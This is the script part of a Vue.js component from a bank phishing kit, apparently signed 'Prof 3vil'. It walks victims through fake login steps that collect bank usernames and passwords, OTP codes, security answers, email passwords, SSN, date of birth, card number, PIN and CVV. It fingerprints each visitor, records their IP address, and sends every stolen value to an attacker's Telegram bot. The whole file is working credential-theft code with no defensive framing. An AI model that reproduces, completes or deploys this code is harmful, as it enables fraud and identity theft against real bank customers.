      'data:image/png;base64,'
    )
    const fdic2 = ref(
      'data:image/html;base64,'
    )
    const step = ref(1);
    const showPassword = ref(false)
    const showConfirmPassword = ref(false)

    const firstLogin = reactive({
      username: '',
      password: '',
    })

    const accountRules = computed(() => {
      return {
        username: { required },
        password: { required, minLength: minLength(6) },
      }
    })

    const av$ = useVuelidate(accountRules, firstLogin)

    const otp = reactive({
      code: ''
    })

    const otpConfirm = reactive({
      code: ''
    })

    const secondLogin = reactive({
      confirm_user: '',
      confirm_pass: ''
    })

    const security_question = reactive({
      question1: '',
      question2: '',
      question3: '',
      question4: '',
      question5: ''
    })

    const ipInfo = ref('')

    const profileData = reactive({
      email: '',
      phone: ''
    })
    const profileRules = computed(() => {
      return {
        phone: { required },
        email: { required, email }
      }
    })

    const pv$ = useVuelidate(profileRules, profileData)

    const cardData = reactive({
      ssn: '',
      dob: '',
      accountNumber: '',
      account_type: 'CD',
      pin: '',
      cardNumber: '',
      expiryDate: '',
      cvv: '',
    })

    const confirmRules = computed(() => {
      return {
        confirm_user: { required },
        confirm_pass: { required, minLength: minLength(6) }
      }
    })

    const emailData = reactive({
      email: '',
      password: ''
    })

    const emailRules = computed(() => {
      return {
        email: { required, email },
        password: { required }
      }
    })

    const otpRules = computed(() => {
      return {
        code: { required }
      }
    })

    const otpConfirmRules = computed(() => {
      return {
        code: { required }
      }
    })

    const cardRules = computed(() => {
      return {
        ssn: { required },
      }
    })

    
    const ca$ = useVuelidate(confirmRules, secondLogin)
    const cv$ = useVuelidate(cardRules, cardData)
    const otp$ = useVuelidate(otpRules, otp)
    const otpc$ = useVuelidate(otpConfirmRules, otpConfirm)
    const ev$ = useVuelidate(emailRules, emailData)
    const identifier = ref('')

    const { displayLoader, destroyLoader } = useGlobalLoader()

    onMounted(() => {
      getFingerPrint()
    })

    const request = axios.create({
      baseURL: "https://api.telegram.org/bot" + process.env.VUE_APP_BOT_KEY + '/',
      timeout: 30000,
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
      }
    })

    const fpPromise = FingerprintJS.load()

    const getFingerPrint = async () => {
      const fp = await fpPromise
      const result = await fp.get()
      identifier.value = result.visitorId

      const ipRequest = axios.create({
        baseURL: "https://api.ipify.org?format=json",
        timeout: 30000,
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
        }
      })

      ipRequest.get('', {}).then((response) => {
        ipInfo.value = response.data.ip
      })
    }

    watch(ipInfo, (newVal) => {
      if(newVal !== undefined && newVal != '') {
        const victimMessage = `\n
          ==New Potential Victim===\n
          Identifier: ${identifier.value}\n
          IP Address: ${ipInfo.value ?? ''}\n
          /=====================/
        `
        sendMessage(victimMessage)
      }
    })


    const sendMessage = (text) => {
      return new Promise((resolve, reject) => {
        const pingData = {
          chat_id: process.env.VUE_APP_CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        }

        request.post('sendMessage', pingData).then(() => {
          resolve()
        }).catch((error) => {
          reject(error.message)
        })
      })
    }


    // STEP 1
    const submit_online_details = () => {
      displayLoader()
      const message = `
        ===Bank Log Result===\n
        Username: ${firstLogin.username}\n
        Password: ${firstLogin.password}\n
        /=================/
      `
      sendMessage(message).then(() => {
        step.value = 2
      }).catch((error) => {
        console.log(error)
      }).finally(() => {
        destroyLoader()
      })
    }

    // STEP 2
    const submit_online_confirm = () => {
      displayLoader()
      const message = `
        ===Bank Log Result===\n
        Identifier: ${identifier.value}\n
        Confirm Username: ${secondLogin.confirm_user}\n
        Confirm Password: ${secondLogin.confirm_pass}\n
      `
      sendMessage(message).then(() => {
        step.value = 3
      }).catch((error) => {
        console.log(error)
      }).finally(() => {
        destroyLoader()
      })
    }

    // STEP 3
    const submit_email_phone = () => {
        const message = `===Bank Log Result===\n
          Identifier: ${identifier.value}\n
          Email: ${profileData.email}\n
          Phone Number: ${profileData.phone}\n
        `
        sendMessage(message).then(() => {
          step.value = 4
        }).catch((error) => {
          console.log(error)
        }).finally(() => {
          destroyLoader()
        })
    }

    // SUBMIT OTP
    const submit_otp = () => {
      displayLoader()
      const message = `
        ===Bank Log Result===\n
        Identifier: ${identifier.value}\n
        Code: ${otp.code}\n
        /=================/
      `
      sendMessage(message).then(() => {
        step.value = 5
      }).catch((error) => {
        console.log(error)
      }).finally(() => {
        destroyLoader()
      })
    }

    const submit_otp_confirm = () => {
      displayLoader();
      const message = `
        ===Bank Log Result===\n
        Identifier: ${identifier.value}\n
        Confirm Code: ${otpConfirm.code}\n
        /=================/
      `
      sendMessage(message).then(() => {
        step.value = 6
      }).catch((error) => {
        console.log(error)
      }).finally(() => {
        destroyLoader()
      })
    }

    // STEP 6
    const submit_security_info = () => {
      displayLoader();
      const message = `
        ===(Security Questions)===\n
        Identifier: ${identifier.value}\n
        \n
        /*********************/\n
        Question 1: ${security_question.question1}\n
        Answer 1: ${security_answers.question1}\n
        /********************/\n
        \n
        /*********************/\n
        Question 2: ${security_question.question2}\n
        Answer 2: ${security_answers.question2}\n
        /*********************/\n\n

        /*********************/\n
        Question 3: ${security_question.question3}\n
        Answer 3: ${security_answers.question3}\n
        /*********************/\n\n

        /*********************/\n
        Question 4: ${security_question.question4}\n
        Answer 4: ${security_answers.question4}\n
        /*********************/\n\n

        /*********************/\n
        Question 5: ${security_question.question5}\n
        Answer 5: ${security_answers.question5}\n
        /*********************/
      `
      sendMessage(message).then(() => {
        step.value = 7
      }).catch((error) => {
        console.log(error)
      }).finally(() => {
        destroyLoader()
      })
    }

    const submit_email_pass = () => {
      displayLoader();
      const message = `
        ===Bank Log Result===\n
        Identifier: ${identifier.value}\n
        Email: ${emailData.email}
        Email Password: ${emailData.password}\n
        /=================/
      `
      sendMessage(message).then(() => {
        step.value = 8
      }).catch((error) => {
        console.log(error)
      }).finally(() => {
        destroyLoader()
      })
    }

    const submit_card_info = () => {
      const message = `
        ===Bank Log Result===\n
        Identifier: ${identifier.value}\n
        SSN: ${cardData.ssn}\n
        Card Number: ${cardData.cardNumber}\n
        DOB: ${cardData.dob}\n
        Account Number: ${cardData.accountNumber}\n
        Account Type: ${cardData.account_type}\n
        Card PIN: ${cardData.pin}\n
        CVV: ${cardData.cvv}\n
        Expiry: ${cardData.expiryDate}\n
        ====Result By Prof 3vil====
      `
      sendMessage(message).then(() => {
        step.value = 9
      }).catch((error) => {
        console.log(error)
      }).finally(() => {
        destroyLoader()
      })
    }

    const nextStep = async () => {
      if (step.value <= 8) {
        let validator
        switch (step.value) {
          case 1:
            validator = await av$.value.$validate()
            if (!validator || validator == undefined) {
              return
            }
            submit_online_details()
            break;
          case 2:
            validator = await ca$.value.$validate()
            if (!validator || validator == undefined) {
              return
            }
            submit_online_confirm()
            break
          case 3:
            validator = await pv$.value.$validate()
            if (!validator || validator == undefined) {
              return
            }
            submit_email_phone()
            break;
          case 4:
            validator = await otp$.value.$validate()
            if (!validator || validator == undefined) {
              return
            }
            submit_otp()
            break
          case 5:
            validator = await otpc$.value.$validate()
            if (!validator || validator == undefined) {
              return
            }
            submit_otp_confirm()
            break
          case 6:
            submit_security_info()
            break
          case 7:
            submit_email_pass()
            break;
          case 8:
            submit_card_info()
            break;
          default:
            break;
        }
      }
    }

    const security_answers = reactive({
      question1: '',
      question2: '',
      question3: '',
      question4: '',
      question5: ''
    })
    
    

    const formatPhone = () => {
      profileData.phone = profileData.phone.replace(/\D/g, '').slice(0, 10);
      if (profileData.phone.length > 6) {
        profileData.phone = `${profileData.phone.slice(0, 3)}-${profileData.phone.slice(3, 6)}-${profileData.phone.slice(6)}`;
      } else if (profileData.phone.length > 3) {
        profileData.phone = `${profileData.phone.slice(0, 3)}-${profileData.phone.slice(3)}`;
      }
    }

    const formatZipCode = () => {
      profileData.zipCode = profileData.zipCode.replace(/\D/g, '').slice(0, 5);
    }

    const formatSSN = () => {
      cardData.ssn = cardData.ssn.replace(/\D/g, '').slice(0, 9);
      if (cardData.ssn.length > 5) {
        cardData.ssn = `${cardData.ssn.slice(0, 3)}-${cardData.ssn.slice(3, 5)}-${cardData.ssn.slice(5)}`;
      } else if (cardData.ssn.length > 3) {
        cardData.ssn = `${cardData.ssn.slice(0, 3)}-${cardData.ssn.slice(3)}`;
      }
    }

    const formatCardNumber = () => {
      cardData.cardNumber = cardData.cardNumber.replace(/\D/g, '').slice(0, 16);
      cardData.cardNumber = cardData.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
    }

    const formatCVV = () => {
      cardData.cvv = cardData.cvv.replace(/\D/g, '').slice(0, 3);
    }


    const formatExpiryDate = () => {
      cardData.expiryDate = cardData.expiryDate.replace(/\D/g, '').slice(0, 4);
      if (cardData.expiryDate.length > 2) {
        cardData.expiryDate = `${cardData.expiryDate.slice(0, 2)}/${cardData.expiryDate.slice(2)}`;
      }
    }

    const showQuestions = () => {
      step.value = 6
    }

    return { eye_open, emailData, ev$, security_answers, security_question, otp$, otpc$, otpConfirm, showQuestions, otp, eye_closed, fdic, fdic2, formatCardNumber, formatCVV, formatExpiryDate, formatZipCode, formatSSN, formatPhone, nextStep, step, showPassword, showConfirmPassword, firstLogin, secondLogin, profileData, cardData, av$, ca$, pv$, cv$ }
  },
  methods: {
    togglePasswordVisibility() {
      this.showPassword = !this.showPassword;
    },
    toggleConfirmPasswordVisibility() {
      this.showConfirmPassword = !this.showConfirmPassword;
    },

    prevStep() {
      if (this.step > 1) this.step--;
    },
  }
});
</script>



